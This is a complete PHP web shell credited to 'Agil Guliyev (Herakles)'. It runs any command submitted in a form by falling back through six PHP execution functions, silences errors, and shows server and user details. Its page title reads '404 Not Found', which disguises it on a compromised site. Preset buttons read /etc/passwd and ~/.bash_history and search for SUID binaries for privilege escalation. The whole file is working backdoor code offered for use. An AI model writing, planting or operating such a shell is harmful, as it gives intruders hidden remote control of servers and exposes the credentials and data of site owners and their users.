<?php
/*
═══════════════════════════════════════════════════════════════════
    🦅 PHP Command Executor - Agil Guliyev (Herakles) 🦅
═══════════════════════════════════════════════════════════════════
*/

@error_reporting(0);
@ini_set('display_errors', 0);

function exe($cmd) {
    $output = '';
    
    // Method 1: shell_exec
    if (function_exists('shell_exec')) {
        $output = @shell_exec($cmd . ' 2>&1');
        if ($output !== null) return $output;
    }
    
    // Method 2: exec
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $arr);
        $output = implode("\n", $arr);
        if ($output) return $output;
    }
    
    // Method 3: system
    if (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $output = ob_get_clean();
        if ($output) return $output;
    }
    
    // Method 4: passthru
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
        if ($output) return $output;
    }
    
    // Method 5: proc_open
    if (function_exists('proc_open')) {
        $proc = @proc_open($cmd, [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ], $pipes);
        if (is_resource($proc)) {
            $output = @stream_get_contents($pipes[1]);
            $output .= @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if ($output) return $output;
        }
    }
    
    // Method 6: popen
    if (function_exists('popen')) {
        $handle = @popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            @pclose($handle);
            if ($output) return $output;
        }
    }
    
    return $output ?: 'Command executed (no output or all functions disabled)';
}

// Execute command if submitted
$result = '';
$cmd = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $result = exe($cmd);
}

// Get system info
$sys_info = [
    'OS' => PHP_OS,
    'User' => @get_current_user(),
    'UID' => @getmyuid(),
    'GID' => @getmygid(),
    'Server' => @gethostname(),
    'CWD' => @getcwd(),
    'PHP' => phpversion(),
    'Disabled' => @ini_get('disable_functions') ?: 'None'
];
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
	<META NAME="robots" CONTENT="noindex,nofollow">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #00ff00;
            font-family: 'Courier New', Consolas, monospace;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 3px solid #00ff00;
            margin-bottom: 30px;
            background: rgba(0, 255, 0, 0.05);
            border-radius: 10px;
        }
        
        .eagle {
            font-size: 60px;
            animation: glow 2s infinite;
        }
        
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00, 0 0 60px #00ff00; }
        }
        
        .signature {
            color: #00ff00;
            font-size: 18px;
            font-weight: bold;
            margin-top: 10px;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 30px;
            background: rgba(0, 255, 0, 0.05);
            padding: 20px;
            border: 1px solid #00ff00;
            border-radius: 10px;
        }
        
        .info-item {
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border-left: 3px solid #00ff00;
        }
        
        .info-label {
            color: #00ff00;
            font-weight: bold;
            font-size: 12px;
        }
        
        .info-value {
            color: #fff;
            font-size: 13px;
            word-wrap: break-word;
        }
        
        .executor {
            background: rgba(0, 255, 0, 0.05);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        h2 {
            color: #00ff00;
            margin-bottom: 15px;
            font-size: 20px;
        }
        
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        input[type="text"] {
            flex: 1;
            background: #000;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
        }
        
        input[type="text"]:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 12px 30px;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00dd00;
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        
        .output {
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            min-height: 400px;
            max-height: 600px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .output pre {
            color: #fff;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .quick-cmds {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .quick-cmd {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 8px 15px;
            font-size: 12px;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
        }
        
        .quick-cmd:hover {
            background: rgba(0, 255, 0, 0.2);
            transform: translateY(-2px);
        }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #000;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #00ff00;
            border-radius: 5px;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px;
            color: #666;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="eagle">🦅</div>
            <div class="signature">PHP Command Executor - Agil Guliyev (Herakles)</div>
        </div>
        
        <div class="info-grid">
            <?php foreach ($sys_info as $label => $value): ?>
            <div class="info-item">
                <div class="info-label"><?= $label ?>:</div>
                <div class="info-value"><?= htmlspecialchars($value) ?></div>
            </div>
            <?php endforeach; ?>
        </div>
        
        <div class="executor">
            <h2>💻 Command Executor</h2>
            
            <div class="quick-cmds">
                <span class="quick-cmd" onclick="setCmd('id')">id</span>
                <span class="quick-cmd" onclick="setCmd('whoami')">whoami</span>
                <span class="quick-cmd" onclick="setCmd('pwd')">pwd</span>
                <span class="quick-cmd" onclick="setCmd('ls -la')">ls -la</span>
                <span class="quick-cmd" onclick="setCmd('uname -a')">uname -a</span>
                <span class="quick-cmd" onclick="setCmd('ps aux')">ps aux</span>
                <span class="quick-cmd" onclick="setCmd('netstat -tulpn')">netstat</span>
                <span class="quick-cmd" onclick="setCmd('cat /etc/passwd')">passwd</span>
                <span class="quick-cmd" onclick="setCmd('find / -perm -4000 2>/dev/null')">SUID</span>
                <span class="quick-cmd" onclick="setCmd('cat ~/.bash_history')">history</span>
            </div>
            
            <form method="POST" id="cmdForm">
                <div class="input-group">
                    <input type="text" name="cmd" id="cmdInput" 
                           placeholder="Enter command..." 
                           value="<?= htmlspecialchars($cmd) ?>" 
                           autofocus>
                    <button type="submit">Execute</button>
                </div>
            </form>
        </div>
        
        <div class="output">
            <?php if ($result): ?>
                <pre><?= htmlspecialchars($result) ?></pre>
            <?php else: ?>
                <div class="empty-state">
                    Enter a command and press Execute to see the output...
                </div>
            <?php endif; ?>
        </div>
    </div>
    
    <script>
        function setCmd(cmd) {
            document.getElementById('cmdInput').value = cmd;
            document.getElementById('cmdInput').focus();
        }
        
        // Auto-scroll to output if there's a result
        <?php if ($result): ?>
        window.onload = function() {
            document.querySelector('.output').scrollIntoView({ behavior: 'smooth', block: 'start' });
        };
        <?php endif; ?>
        
        // Keyboard shortcut: Ctrl+Enter to submit
        document.getElementById('cmdInput').addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                document.getElementById('cmdForm').submit();
            }
        });
    </script>
</body>
</html>
<?php
/*
═══════════════════════════════════════════════════════════════════
                    🦅 END OF EXECUTOR 🦅
═══════════════════════════════════════════════════════════════════
*/
?>